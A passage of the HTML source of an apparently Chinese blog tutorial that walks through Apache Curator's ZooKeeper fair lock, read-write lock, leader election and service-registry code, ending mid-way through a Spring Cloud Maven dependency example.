    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// 第一次进入 需要尝试获取锁</span></span><br><span class="line">    <span class="comment">// 通过LockInternals的attemptLock方法获取锁</span></span><br><span class="line">    <span class="comment">// getLockNodeBytes方法默认返回的是null，留给子类实现</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">lockPath</span> <span class="operator">=</span> internals.attemptLock(time, unit, getLockNodeBytes());</span><br><span class="line">    <span class="comment">// 如果获取锁成功</span></span><br><span class="line">    <span class="keyword">if</span> ( lockPath != <span class="literal">null</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 将当前线程信息和锁信息存入threadData缓存，便于锁的重入</span></span><br><span class="line">        <span class="type">LockData</span> <span class="variable">newLockData</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LockData</span>(currentThread, lockPath);</span><br><span class="line">        threadData.put(currentThread, newLockData);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>LockInternals的<code>attemptLock</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String <span class="title function_">attemptLock</span><span class="params">(<span class="type">long</span> time, TimeUnit unit, <span class="type">byte</span>[] lockNodeBytes)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="comment">// 相对不重要的参数</span></span><br><span class="line">       <span class="keyword">final</span> <span class="type">long</span>      <span class="variable">startMillis</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">       <span class="keyword">final</span> <span class="type">Long</span>      <span class="variable">millisToWait</span> <span class="operator">=</span> (unit != <span class="literal">null</span>) ? unit.toMillis(time) : <span class="literal">null</span>;</span><br><span class="line">       <span class="keyword">final</span> <span class="type">byte</span>[]    localLockNodeBytes = (revocable.get() != <span class="literal">null</span>) ? <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>] : lockNodeBytes;</span><br><span class="line">       <span class="type">int</span>             <span class="variable">retryCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">       <span class="type">String</span>          <span class="variable">ourPath</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="type">boolean</span>         <span class="variable">hasTheLock</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">       <span class="type">boolean</span>         <span class="variable">isDone</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">       <span class="comment">// 循环</span></span><br><span class="line">       <span class="keyword">while</span> ( !isDone )</span><br><span class="line">       &#123;</span><br><span class="line">           isDone = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">try</span></span><br><span class="line">           &#123;</span><br><span class="line">               <span class="comment">// 通过StandardLockInternalsDriver的createsTheLock方法创建锁结点</span></span><br><span class="line">               <span class="comment">// 只是创建结点，并不一定能获取到锁</span></span><br><span class="line">               ourPath = driver.createsTheLock(client, path, localLockNodeBytes);</span><br><span class="line">               <span class="comment">// 通过internalLockLoop方法判断是否获取到锁</span></span><br><span class="line">               hasTheLock = internalLockLoop(startMillis, millisToWait, ourPath);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">catch</span> ( KeeperException.NoNodeException e )</span><br><span class="line">           &#123;</span><br><span class="line">               ....</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 如果获取到锁</span></span><br><span class="line">       <span class="keyword">if</span> ( hasTheLock )</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="comment">// 返回锁结点路径</span></span><br><span class="line">           <span class="keyword">return</span> ourPath;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>StandardLockInternalsDriver的<code>createsTheLock</code>方法创建锁结点：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">createsTheLock</span><span class="params">(CuratorFramework client, String path, <span class="type">byte</span>[] lockNodeBytes)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">    String ourPath;</span><br><span class="line">    <span class="comment">// 这里传入的lockNodeBytes默认为null，所以会进入else</span></span><br><span class="line">    <span class="keyword">if</span> ( lockNodeBytes != <span class="literal">null</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        ourPath = client.create().creatingParentContainersIfNeeded().withProtection().withMode(CreateMode.EPHEMERAL_SEQUENTIAL).forPath(path, lockNodeBytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 通过Curator客户端创建节点</span></span><br><span class="line">        ourPath = client.create()</span><br><span class="line">            .creatingParentContainersIfNeeded() <span class="comment">// 创建的锁节点是容器节点</span></span><br><span class="line">            .withProtection() <span class="comment">// 通过Protection模式创建，防止僵尸节点</span></span><br><span class="line">            .withMode(CreateMode.EPHEMERAL_SEQUENTIAL) <span class="comment">// 每个客户端创建的是临时顺序节点</span></span><br><span class="line">            .forPath(path); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ourPath;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Curator客户端创建顺序节点成功后，如果由于网络问题没有收到服务器的返回结果，会进行重试，如果不进行任何处理操作，那么会创建一个新的顺序节点，那么之前的节点就被称为<strong>僵尸节点</strong>。</p>
<p>Curator提供了一种Protection模式，创建节点时会给节点加一个uuid作为前缀，由于网络问题没有收到服务器的返回结果进行重试的时候，会先用uuid检查是否已经创建过，这样就可以防止僵尸节点的产生。 </p>
</blockquote>
<p>创建完节点后，再回到LockInternals的<code>internalLockLoop</code>节点判断是否能获取锁：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">internalLockLoop</span><span class="params">(<span class="type">long</span> startMillis, Long millisToWait, String ourPath)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="type">boolean</span>     <span class="variable">haveTheLock</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">       <span class="type">boolean</span>     <span class="variable">doDelete</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">       <span class="keyword">try</span></span><br><span class="line">       &#123;</span><br><span class="line">          ...</span><br><span class="line">          <span class="keyword">while</span> ( (client.getState() == CuratorFrameworkState.STARTED) &amp;&amp; !haveTheLock )</span><br><span class="line">          &#123;</span><br><span class="line">               </span><br><span class="line">               <span class="comment">// 通过getSortedChildren方法获得锁节点下的所有顺序节点</span></span><br><span class="line">               <span class="comment">// 并且按照序号从小到大排序</span></span><br><span class="line">               List&lt;String&gt;  children = getSortedChildren();</span><br><span class="line">               <span class="comment">// 获取顺序节点名称，截去父节点</span></span><br><span class="line">               <span class="type">String</span>   <span class="variable">sequenceNodeName</span> </span><br><span class="line">                   <span class="operator">=</span> ourPath.substring(basePath.length() + <span class="number">1</span>); </span><br><span class="line">              <span class="comment">//  通过StandardLockInternalsDriver的getsTheLock方法判断是否获取到锁</span></span><br><span class="line">              <span class="comment">// 如果获取锁失败，会返回当前顺序结点的前一个结点</span></span><br><span class="line">              <span class="comment">// 如果获取锁成功，会返回null</span></span><br><span class="line">              <span class="comment">// 公平锁的话这里传入的maxLeases=1</span></span><br><span class="line">               <span class="type">PredicateResults</span>    <span class="variable">predicateResults</span> <span class="operator">=</span> driver.getsTheLock(client, children, sequenceNodeName, maxLeases);</span><br><span class="line">              </span><br><span class="line">               <span class="comment">// 如果获取到锁</span></span><br><span class="line">               <span class="keyword">if</span> ( predicateResults.getsTheLock() )</span><br><span class="line">               &#123;</span><br><span class="line">                   haveTheLock = <span class="literal">true</span>;</span><br><span class="line">               &#125;</span><br><span class="line">              <span class="comment">// 如果没获取到锁</span></span><br><span class="line">               <span class="keyword">else</span></span><br><span class="line">               &#123;</span><br><span class="line">                   <span class="comment">// 得到当前顺序结点的前一个结点路径，也就是需要监听的结点</span></span><br><span class="line">                   <span class="type">String</span>  <span class="variable">previousSequencePath</span> <span class="operator">=</span> basePath + <span class="string">&quot;/&quot;</span> + predicateResults.getPathToWatch();</span><br><span class="line">                   <span class="keyword">synchronized</span>(<span class="built_in">this</span>)</span><br><span class="line">                   &#123;</span><br><span class="line">                       <span class="keyword">try</span></span><br><span class="line">                       &#123;</span><br><span class="line">                           <span class="comment">// 通过Curator客户端添加监听，监听的是当前顺序节点的前一个结点</span></span><br><span class="line">                           client.getData()</span><br><span class="line">                               .usingWatcher(watcher)</span><br><span class="line">                               .forPath(previousSequencePath);</span><br><span class="line">                           <span class="keyword">if</span> ( millisToWait != <span class="literal">null</span> )</span><br><span class="line">                           &#123;</span><br><span class="line">                               millisToWait -= (System.currentTimeMillis() - startMillis);</span><br><span class="line">                               startMillis = System.currentTimeMillis();</span><br><span class="line">                               <span class="keyword">if</span> ( millisToWait &lt;= <span class="number">0</span> )</span><br><span class="line">                               &#123;</span><br><span class="line">                                   doDelete = <span class="literal">true</span>;    <span class="comment">// timed out - delete our node</span></span><br><span class="line">                                   <span class="keyword">break</span>;</span><br><span class="line">                               &#125;</span><br><span class="line">							<span class="comment">// 线程等待</span></span><br><span class="line">                               <span class="comment">// 当监听到前一个顺序结点被删除的事件后</span></span><br><span class="line">                               <span class="comment">// 监听器会通过notify唤醒当前线程</span></span><br><span class="line">                               wait(millisToWait);</span><br><span class="line">                           &#125;</span><br><span class="line">                           <span class="keyword">else</span></span><br><span class="line">                           &#123;</span><br><span class="line">                               wait();</span><br><span class="line">                           &#125;</span><br><span class="line">                       &#125;</span><br><span class="line">                       ...</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">return</span> haveTheLock;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>StandardLockInternalsDriver的<code>getsTheLock</code>方法判断是否获取到锁：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">   <span class="comment">// 公平锁的话这里传入的maxLeases=1，在创建InterProcessMutex对象时确定</span></span><br><span class="line"><span class="keyword">public</span> PredicateResults <span class="title function_">getsTheLock</span><span class="params">(CuratorFramework client, List&lt;String&gt; children, String sequenceNodeName, <span class="type">int</span> maxLeases)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="comment">// 获取当前顺序结点的索引</span></span><br><span class="line">       <span class="type">int</span>             <span class="variable">ourIndex</span> <span class="operator">=</span> children.indexOf(sequenceNodeName);</span><br><span class="line">       validateOurIndex(sequenceNodeName, ourIndex);</span><br><span class="line">	   <span class="comment">// 如果索引小于1，也就是索引为0 [maxLeases=1]</span></span><br><span class="line">       <span class="type">boolean</span>         <span class="variable">getsTheLock</span> <span class="operator">=</span> ourIndex &lt; maxLeases;</span><br><span class="line">       <span class="comment">// 说明当前线程排在第一个，可以获取锁</span></span><br><span class="line">       <span class="comment">// 否则不能获取锁，需要监听前一个顺序结点</span></span><br><span class="line">       <span class="type">String</span>          <span class="variable">pathToWatch</span> <span class="operator">=</span> getsTheLock ? <span class="literal">null</span> : children.get(ourIndex - maxLeases);</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">PredicateResults</span>(pathToWatch, getsTheLock);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>Curator公平锁的实现流程大致如下：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/06/06/uN5qWTzrlsUd3wB.jpg"
                      alt="Screenshot_98.jpg"
                ></p>
<h3 id="zookeeper和redis区别"><a href="#zookeeper和redis区别" class="headerlink" title="zookeeper和redis区别"></a>zookeeper和redis区别</h3><p>两者做分布式锁的区别在于两者的集群结构不一致</p>
<p>redis是主从分布结构，写入时是在Master中写入，然后再同步到到从机中</p>
<p>zookeeper是Leader和Follower结构，每次写入是需要根据Follower写入成功的次数进行判断的【比如有三个Follower，需要3&#x2F;2+1&#x3D;2，也就是两个Follower写入成功才被认为写入成功。【也被称为zb协议</p>
<p>那么在redis中如果写入成功，但是还未完成同步时宕机了，那么也就导致信息丢失了。</p>
<h3 id="读写锁"><a href="#读写锁" class="headerlink" title="读写锁"></a>读写锁</h3><p>前面这两种加锁方式有一个共同的特质，就是都是<strong>互斥锁</strong>，同一时间只能有一个请求占用，如果是大量的并发上来，性能是会急剧下降的。Curator还实现了读写锁，在读多写少的情况下性能会有很大提升。</p>
<h4 id="实现思路-1"><a href="#实现思路-1" class="headerlink" title="实现思路"></a>实现思路</h4><p>读写锁和公平锁的思路类似，同样需要借助顺序节点实现：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/01/30/zg5pivh8YdbROwL.png"
                      alt="zk11.jpg"
                ></p>
<p>根据读写锁的特性，之前公平锁的监听方式需要稍作修改：</p>
<ul>
<li>读节点监听在它前面最近的一个写节点</li>
<li>写节点监听它的前一个节点，和公平锁一样</li>
</ul>
<p>这样就可以实现一个读写锁。</p>
<h4 id="Curator源码分析-1"><a href="#Curator源码分析-1" class="headerlink" title="Curator源码分析"></a>Curator源码分析</h4><p>Curator客户端实现了读写锁，使用方法也很简单：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建读写锁</span></span><br><span class="line"><span class="type">InterProcessReadWriteLock</span> <span class="variable">lock</span> <span class="operator">=</span> </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InterProcessReadWriteLock</span>(curatorFramework, <span class="string">&quot;/readwritelock&quot;</span>);</span><br><span class="line"><span class="comment">// 读锁</span></span><br><span class="line"><span class="type">InterProcessMutex</span> <span class="variable">readLock</span> <span class="operator">=</span> lock.readLock();</span><br><span class="line"><span class="comment">// 写锁</span></span><br><span class="line"><span class="type">InterProcessMutex</span> <span class="variable">writeLock</span> <span class="operator">=</span> lock.writeLock();</span><br><span class="line"><span class="comment">// 获取读锁</span></span><br><span class="line">readLock.acquire();</span><br><span class="line"><span class="comment">// 释放读锁</span></span><br><span class="line">readLock.release();</span><br><span class="line"><span class="comment">// 获取写锁</span></span><br><span class="line">writeLock.acquire();</span><br><span class="line"><span class="comment">// 释放写锁</span></span><br><span class="line">writeLock.release();</span><br></pre></td></tr></table></figure>

<p>首先来看一下读写锁InterProcessReadWriteLock的构造方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InterProcessReadWriteLock</span><span class="params">(CuratorFramework client, String basePath, <span class="type">byte</span>[] lockData)</span></span><br><span class="line">&#123;</span><br><span class="line">    lockData = (lockData == <span class="literal">null</span>) ? <span class="literal">null</span> : Arrays.copyOf(lockData, lockData.length);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写锁</span></span><br><span class="line">    writeMutex = <span class="keyword">new</span> <span class="title class_">InternalInterProcessMutex</span></span><br><span class="line">    (</span><br><span class="line">        client,</span><br><span class="line">        basePath,</span><br><span class="line">        WRITE_LOCK_NAME,</span><br><span class="line">        lockData,</span><br><span class="line">        <span class="comment">// 这里是区分读写锁的关键，写锁传入的是1</span></span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">SortingLockInternalsDriver</span>()</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="comment">// 这里重写了StandardLockInternalsDriver的getsTheLock方法</span></span><br><span class="line">            <span class="keyword">public</span> PredicateResults <span class="title function_">getsTheLock</span><span class="params">(CuratorFramework client, List&lt;String&gt; children, String sequenceNodeName, <span class="type">int</span> maxLeases)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 直接调用原来的方法，相当于没重写</span></span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">super</span>.getsTheLock(client, children, sequenceNodeName, maxLeases);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读锁</span></span><br><span class="line">    readMutex = <span class="keyword">new</span> <span class="title class_">InternalInterProcessMutex</span></span><br><span class="line">    (</span><br><span class="line">        client,</span><br><span class="line">        basePath,</span><br><span class="line">        READ_LOCK_NAME,</span><br><span class="line">        lockData,</span><br><span class="line">        <span class="comment">// 这里是区分读写锁的关键，读锁传入的是Integer.MAX_VALUE</span></span><br><span class="line">        Integer.MAX_VALUE,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">SortingLockInternalsDriver</span>()</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="comment">// 这里重写了StandardLockInternalsDriver的getsTheLock方法</span></span><br><span class="line">            <span class="keyword">public</span> PredicateResults <span class="title function_">getsTheLock</span><span class="params">(CuratorFramework client, List&lt;String&gt; children, String sequenceNodeName, <span class="type">int</span> maxLeases)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 调用了readLockPredicate方法</span></span><br><span class="line">                <span class="keyword">return</span> readLockPredicate(children, sequenceNodeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写锁的创建和执行流程和公平锁几乎一模一样，都是获取锁失败失败监听前一个结点。</p>
<p>但是读锁略有不同，它在获取锁失败后需要，监听在它之前最近的一个写结点。</p>
<p>读锁创建时，重写了StandardLockInternalsDriver的<code>getsTheLock</code>方法，该方法用于判断是否获取到锁并且添加监听。重写的方法回调用InterProcessReadWriteLock的<code>readLockPredicate</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> PredicateResults <span class="title function_">readLockPredicate</span><span class="params">(List&lt;String&gt; children, String sequenceNodeName)</span> <span class="keyword">throws</span> Exception</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="keyword">if</span> ( writeMutex.isOwnedByCurrentThread() )</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">PredicateResults</span>(<span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="type">int</span>         <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">     <span class="type">int</span>         <span class="variable">firstWriteIndex</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">     <span class="type">int</span>         <span class="variable">ourIndex</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">     <span class="comment">// 遍历锁结点下的所有顺序结点</span></span><br><span class="line">     <span class="keyword">for</span> ( String node : children )</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="comment">// 如果当前节点是写节点</span></span><br><span class="line">         <span class="keyword">if</span> ( node.contains(WRITE_LOCK_NAME) )</span><br><span class="line">         &#123;</span><br><span class="line">             <span class="comment">// 记录它的索引</span></span><br><span class="line">             firstWriteIndex = Math.min(index, firstWriteIndex);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="comment">// 如果当前节点就是自己</span></span><br><span class="line">         <span class="keyword">else</span> <span class="keyword">if</span> ( node.startsWith(sequenceNodeName) )</span><br><span class="line">         &#123;</span><br><span class="line">             <span class="comment">// ourIndex表示自己的位置</span></span><br><span class="line">             ourIndex = index;</span><br><span class="line">             <span class="comment">// 退出循环</span></span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         &#125;</span><br><span class="line"><span class="comment">// 索引加1</span></span><br><span class="line">         ++index;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     StandardLockInternalsDriver.validateOurIndex(sequenceNodeName, ourIndex);</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 如果自己的索引小于第一个写节点的索引，表示前面没有写节点，直接获取锁</span></span><br><span class="line">     <span class="comment">// 否则需要接听该写节点</span></span><br><span class="line">     <span class="type">boolean</span>     <span class="variable">getsTheLock</span> <span class="operator">=</span> (ourIndex &lt; firstWriteIndex);</span><br><span class="line">     <span class="type">String</span>      <span class="variable">pathToWatch</span> <span class="operator">=</span> getsTheLock ? <span class="literal">null</span> : children.get(firstWriteIndex);</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">PredicateResults</span>(pathToWatch, getsTheLock);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>按照以上代码的逻辑，就实现了读锁的共享。</p>
<h2 id="Leader选举"><a href="#Leader选举" class="headerlink" title="Leader选举"></a>Leader选举</h2><blockquote>
<p>这里的Leader选举并不是Zookeeper集群中的Leader选举。</p>
</blockquote>
<p>在分布式场景中，我们常常会启动很多微服务节点作为一个微服务集群，它们的代码都是一样的，只是用作负载均衡。但是如果我们要进行类似<strong>缓存预热</strong>的操作，只需要一个微服务节点进行操作，该如何操作？</p>
<p>【也就是从集群中找一个节点来提供服务  </p>
<p>其实分布式锁就可以实现，但是Curator为我们提供了一个更加方便的Leader选举功能：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建一个LeaderSelectorListenerAdapter</span></span><br><span class="line"><span class="type">LeaderSelectorListener</span> <span class="variable">listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LeaderSelectorListenerAdapter</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 实现takeLeadership方法</span></span><br><span class="line">    <span class="comment">// 如果当前节点成为了Leader，就会执行该方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">takeLeadership</span><span class="params">(CuratorFramework client)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">		<span class="comment">// 执行业务逻辑，比如缓存预热</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个LeaderSelector节点选举器</span></span><br><span class="line"><span class="comment">// 传入参数：Curator客户端、一个节点路径、LeaderSelectorListenerAdapter对象</span></span><br><span class="line"><span class="type">LeaderSelector</span> <span class="variable">selector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LeaderSelector</span>(curatorFramework, <span class="string">&quot;/leader&quot;</span>, listener);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果调用了autoRequeue方法，那么选出的Leader节点执行完takeLeadership方法后会开始下一轮选举</span></span><br><span class="line"><span class="comment">// 如果没调用autoRequeue方法，只会进行一轮选举</span></span><br><span class="line">selector.autoRequeue(); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 开始选举</span></span><br><span class="line">selector.start();</span><br></pre></td></tr></table></figure>

<p>Leader选举功能的实现其实就是基于锁的，不过该功能的使用场景较少，在一些特殊场景可能会用到。</p>
<h2 id="注册中心"><a href="#注册中心" class="headerlink" title="注册中心"></a>注册中心</h2><p>用Zookeeper实现注册中心是非常常见的一个应用场景。</p>
<p>在复杂的微服务系统中，各个微服务节点都有自己不同的IP和端口号，并且在复杂的调用关系中，维护每个微服务节点的地址是一件不容易的事情，特别是在风云多变的网络环境中。</p>
<p>所以使用注册中心，用于管理、维护整个系统的服务，并且便于服务间的调用，还是非常必要的。</p>
<h3 id="原理简介"><a href="#原理简介" class="headerlink" title="原理简介"></a>原理简介</h3><p>Zookeeper实现注册中的原理其实并不复杂。假设A服务要调用B服务：</p>
<ul>
<li>B服务集群启动后，每个微服务节点向Zookeeper中创建一个临时节点，比如：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 假设服务B集群有三个微服务节点</span></span><br><span class="line"><span class="comment"># 节点路径             # 节点内容</span></span><br><span class="line">service-B/node1  &#123;<span class="string">&quot;ip&quot;</span>:<span class="string">&quot;192.168.77.88&quot;</span>,<span class="string">&quot;port&quot;</span>:<span class="string">&quot;8081&quot;</span>&#125;</span><br><span class="line">service-B/node2  &#123;<span class="string">&quot;ip&quot;</span>:<span class="string">&quot;192.168.77.89&quot;</span>,<span class="string">&quot;port&quot;</span>:<span class="string">&quot;8082&quot;</span>&#125;</span><br><span class="line">service-B/node3  &#123;<span class="string">&quot;ip&quot;</span>:<span class="string">&quot;192.168.77.90&quot;</span>,<span class="string">&quot;port&quot;</span>:<span class="string">&quot;8083&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>由于是临时节点，服务需要每隔一段时间向Zookeeper发送一次<strong>心跳</strong>，用于通知自己状态正常。如果Zookeeper超过一定时间没有收到某个节点的心跳，会将该节点删除。</li>
<li>A服务<strong>监听</strong>B服务集群在Zookeeper中的节点，将数据缓存在本地。一旦B服务集群状态有了变化，可以立刻收到事件通知，修改缓存。</li>
<li>A服务调用B服务时，直接从本地缓存中就可以拿到B服务集群中所有节点的地址，可以进行负载均衡、失败重试等操作。</li>
</ul>
<p>在zookeeper中，进行服务注册，实际上就是在zookeeper中创建了一个znode节点，该节点存储了该服务的IP、端口、调用方式(协议、序列化方式)等。</p>
<p>该节点承担着最重要的职责，它由服务提供者(发布服务时)创建，以供服务消费者获取节点中的信息，从而定位到服务提供者真正网络拓扑位置以及得知如何调用。</p>
<p>同时zookeeper服务需要对服务的宕机和新增进行信息更新，这就是zookeeper的监听机制了，由于zookeeper使用的是临时节点，那么需要服务端给节点发送心跳，如果心跳终止，那么认为节点宕机了，需要删除节点。</p>
<p>此时客户端由于监听了节点信息，发现某个节点消失，那么会更新本地缓存信息，同时再次监听节点。</p>
<h3 id="Spring-Cloud案例"><a href="#Spring-Cloud案例" class="headerlink" title="Spring Cloud案例"></a>Spring Cloud案例</h3><p>之前在介绍<a class="link"   href="https://jimmyz.top/2020/08/15/dubbo/" >Dubbo<i class="fas fa-external-link-alt"></i></a>的时候，我们就通过Zookeeper作为注册中心搭建了一个最简单的微服务架构。其实<strong>Spring Cloud</strong>也支持使用Zookeeper作为注册中心。我们就通过Zookeeper作为注册中心搭建一个简单的Spring Cloud架构：</p>
<h4 id="消费端"><a href="#消费端" class="headerlink" title="消费端"></a>消费端</h4><ul>
<li>导入依赖</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- spring boot--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.5.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- spring boot web模块 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- zookeeper注册中心 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-zookeeper-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- spring cloud--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>Hoxton.SR8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span 